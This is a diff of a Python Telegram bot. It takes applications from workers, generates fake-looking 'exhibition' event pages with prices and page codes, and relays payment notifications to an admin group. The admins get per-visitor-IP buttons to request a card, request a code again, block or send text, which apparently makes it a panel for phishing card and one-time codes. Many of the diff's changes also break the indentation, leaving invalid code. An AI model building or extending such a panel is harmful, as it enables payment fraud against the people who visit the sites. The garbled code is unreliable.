@@ -391,11 +391,11 @@ async def skip_screenshots(message: types.Message):
     print(f"[DEBUG] Message text: '{message.text}'")
     if user_step.get(uid) == 'screenshots':
         print(f"[DEBUG] User is in screenshots step, processing...")
-        if 'screenshots' not in user_data.get(uid, {}):
-            user_data.setdefault(uid, {})['screenshots'] = []
+    if 'screenshots' not in user_data.get(uid, {}):
+        user_data.setdefault(uid, {})['screenshots'] = []
         try:
             print(f"[DEBUG] Calling finish_form...")
-            await finish_form(message)
+    await finish_form(message)
             print(f"[DEBUG] finish_form completed successfully")
         except Exception as e:
             print(f"[ERROR] finish_form failed: {e}")
@@ -453,19 +453,19 @@ async def finish_form(message):
     else:
         text += f"Скриншоты: не предоставлены\n"
     kb = InlineKeyboardMarkup(
-        inline_keyboard=[[ 
+        inline_keyboard=[[
             InlineKeyboardButton(text="Принять", callback_data=f"approve_{uid}"),
             InlineKeyboardButton(text="Отклонить", callback_data=f"reject_{uid}")
         ]]
     )
     try:
         print(f"[DEBUG] Sending message to ADMIN_GROUP_ID: {ADMIN_GROUP_ID}")
-        await bot.send_message(ADMIN_GROUP_ID, text, parse_mode='HTML', reply_markup=kb)
+    await bot.send_message(ADMIN_GROUP_ID, text, parse_mode='HTML', reply_markup=kb)
         print(f"[DEBUG] Admin message sent successfully")
         for ph in screenshots:
-            await bot.send_photo(ADMIN_GROUP_ID, ph)
+        await bot.send_photo(ADMIN_GROUP_ID, ph)
         print(f"[DEBUG] Sending confirmation to user")
-        await message.answer("Ваша анкета проверяется администрацией!\nОжидайте решение", reply_markup=ReplyKeyboardRemove())
+    await message.answer("Ваша анкета проверяется администрацией!\nОжидайте решение", reply_markup=ReplyKeyboardRemove())
         print(f"[DEBUG] User confirmation sent successfully")
         save_user(uid, 'pending', username, source, invited_by, experience, screenshots, data)
         print(f"[DEBUG] User data saved successfully")
@@ -1192,73 +1192,73 @@ async def events_start(message: types.Message):
 async def events_save_all(message):
     chat_id = message.chat.id
     try:
-        event_id = str(uuid.uuid4())
-        short_event_id = event_id[:6]
-        events_file = os.path.join('events-art.com', 'events.json')
-        # Завантажуємо існуючі події
-        try:
-            with open(events_file, 'r', encoding='utf-8') as f:
-                events = json.load(f)
+    event_id = str(uuid.uuid4())
+    short_event_id = event_id[:6]
+    events_file = os.path.join('events-art.com', 'events.json')
+    # Завантажуємо існуючі події
+    try:
+        with open(events_file, 'r', encoding='utf-8') as f:
+            events = json.load(f)
         except Exception as e:
             print(f"[EVENTS] Не вдалося прочитати events.json: {e}")
-            events = {}
-        # Додаємо нову подію
+        events = {}
+    # Додаємо нову подію
         user_event = EVENT_user_data.get(chat_id)
         if not user_event:
             await message.answer("❗️ Дані івенту не знайдено. Спробуйте ще раз з початку.")
             print(f"[EVENTS] EVENT_user_data порожній для chat_id={chat_id}")
             return
-        events[event_id] = {
-            'title': user_event.get('title', 'Выставка'),
-            'price': user_event.get('price', '45'),
-            'currency': user_event.get('currency', 'EUR'),
-            'address': user_event.get('address', ''),
-            'events': [
-                {
-                    'name': EVENT_FIXED_EVENTS[i],
-                    'path': EVENT_FIXED_PATHS[i],
-                    'date': user_event['dates'][i],
-                    'time': user_event['times'][i]
-                } for i in range(8)
-            ]
-        }
-        with open(events_file, 'w', encoding='utf-8') as f:
-            json.dump(events, f, ensure_ascii=False, indent=2)
-        
-        # --- Створюємо запис у site_users ---
-        price = user_event.get('price', '45')
-        currency = user_event.get('currency', 'EUR')
-        street = user_event.get('address', '')
-        dates = user_event.get('dates', [''] * 8)
-        times = user_event.get('times', [''] * 8)
-        # Об'єднуємо дату і час у формат "дата час"
-        combined_dates = []
-        for i in range(8):
-            if dates[i] and times[i]:
-                combined_dates.append(f"{dates[i]} {times[i]}")
-            else:
-                combined_dates.append(dates[i] if dates[i] else '')
+    events[event_id] = {
+        'title': user_event.get('title', 'Выставка'),
+        'price': user_event.get('price', '45'),
+        'currency': user_event.get('currency', 'EUR'),
+        'address': user_event.get('address', ''),
+        'events': [
+            {
+                'name': EVENT_FIXED_EVENTS[i],
+                'path': EVENT_FIXED_PATHS[i],
+                'date': user_event['dates'][i],
+                'time': user_event['times'][i]
+            } for i in range(8)
+        ]
+    }
+    with open(events_file, 'w', encoding='utf-8') as f:
+        json.dump(events, f, ensure_ascii=False, indent=2)
+    
+    # --- Створюємо запис у site_users ---
+    price = user_event.get('price', '45')
+    currency = user_event.get('currency', 'EUR')
+    street = user_event.get('address', '')
+    dates = user_event.get('dates', [''] * 8)
+    times = user_event.get('times', [''] * 8)
+    # Об'єднуємо дату і час у формат "дата час"
+    combined_dates = []
+    for i in range(8):
+        if dates[i] and times[i]:
+            combined_dates.append(f"{dates[i]} {times[i]}")
+        else:
+            combined_dates.append(dates[i] if dates[i] else '')
         site_user_id, page_code = create_site_user(combined_dates, currency, street, price)
-        
-        # Формуємо повідомлення з посиланнями
-        msg = f"Выставка успешно создана:\n<b>{user_event.get('title', 'Выставка')}</b>\n"
+    
+    # Формуємо повідомлення з посиланнями
+    msg = f"Выставка успешно создана:\n<b>{user_event.get('title', 'Выставка')}</b>\n"
         msg += f"💵 Цена: <b>{price} {currency}</b>\n"
-        msg += f"📍 Адрес: <b>{street or 'Не указан'}</b>\n"
+    msg += f"📍 Адрес: <b>{street or 'Не указан'}</b>\n"
         msg += f"🆔 Site User ID: <code>{site_user_id}</code>\n"
         msg += f"🔖 Page Code: <code>{page_code}</code>\n\n"
-        msg += f"<b>Афиша:</b>\n"
+    msg += f"<b>Афиша:</b>\n"
         msg += f"<b>Главная страница:</b> http://{EVENT_DOMAIN}/?page={page_code}\n"
-        for idx, ev in enumerate(events[event_id]['events'], 1):
-            path = ev['path']
-            if path.endswith('/index.html'):
-                path = path[:-10]
+    for idx, ev in enumerate(events[event_id]['events'], 1):
+        path = ev['path']
+        if path.endswith('/index.html'):
+            path = path[:-10]
             link = f"http://{EVENT_DOMAIN}/{path}?page={page_code}"
-            msg += f"{idx}. {ev['name']} ({ev['date']} {ev['time']})\n{link}\n"
-        await message.answer(msg, parse_mode='HTML')
-        
-        # Повертаємо меню після створення виставки
-        kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
-        await message.answer("Головне меню:", reply_markup=kb)
+        msg += f"{idx}. {ev['name']} ({ev['date']} {ev['time']})\n{link}\n"
+    await message.answer(msg, parse_mode='HTML')
+    
+    # Повертаємо меню після створення виставки
+    kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
+    await message.answer("Головне меню:", reply_markup=kb)
         
         # Зберігаємо зв'язок page_code <-> site_user_id (замість event_code)
         c = conn.cursor()
@@ -1352,17 +1352,17 @@ async def payment_notify(request):
     )
     kb2 = InlineKeyboardMarkup(
         inline_keyboard=[
-            [
-                InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
-                InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
-                InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
-                InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
-            ],
-            [
+        [
+            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
+            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
+            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
+            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
+        ],
+        [
                 InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
-                InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
-            ]
+            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
         ]
+    ]
     )
     await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
 
@@ -1414,8 +1414,8 @@ async def admin_action_handler(call: types.CallbackQuery):
         await call.answer("Користувач розблокований")
     elif action == 'support':
         # Надсилаємо POST на /set_support_flag
-        import aiohttp as aiohttp_client
-        async with aiohttp_client.ClientSession() as session:
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
         await call.answer("Включена технічна підтримка")
     elif action == 'text':
@@ -1423,8 +1423,8 @@ async def admin_action_handler(call: types.CallbackQuery):
         user_step[call.from_user.id] = f'text_for_{ip}'
     elif action == 'code_request_again':
         # Надсилаємо POST на /set_request_again з кодом
-        import aiohttp as aiohttp_client
-        async with aiohttp_client.ClientSession() as session:
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
         await call.answer("Код запитується знову")
 
